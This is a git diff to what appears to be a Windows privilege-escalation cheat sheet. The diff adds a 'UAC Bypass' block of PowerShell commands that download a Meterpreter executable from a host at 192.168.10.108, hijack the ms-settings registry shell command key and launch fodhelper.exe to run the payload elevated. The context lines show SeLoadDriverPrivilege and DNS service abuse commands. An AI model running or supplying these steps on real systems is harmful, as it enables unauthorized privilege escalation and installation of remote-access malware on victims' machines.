@@ -133,7 +133,17 @@ C:\> sc sdshow scmanager
 D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
 
 ```
+### UAC Bypass
+```
+[Environment]::Is64BitProcess
+dir C:\Windows\System32\fodhelper.exe
+Invoke-WebRequest -Uri http://192.168.10.108/Met.exe -Outfile C:\Meterpreter.exe
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell.exe -exec bypass -c C:\Met.exe" -Force
+C:\Windows\System32\fodhelper.exe
 
+```
 
 
 ### SeLoadDriverPrivilege for privilege escalation
@@ -152,6 +162,9 @@ Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name S
 sc.exe stop dns
 sc.exe start dns
 ```
+
+
+
 * [tarlogic](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
 * [8btc](https://www.8btc.com/article/113116)
 * [SDDL Explained] (https://clan8blog.wordpress.com/2016/08/08/sddl-explained/)
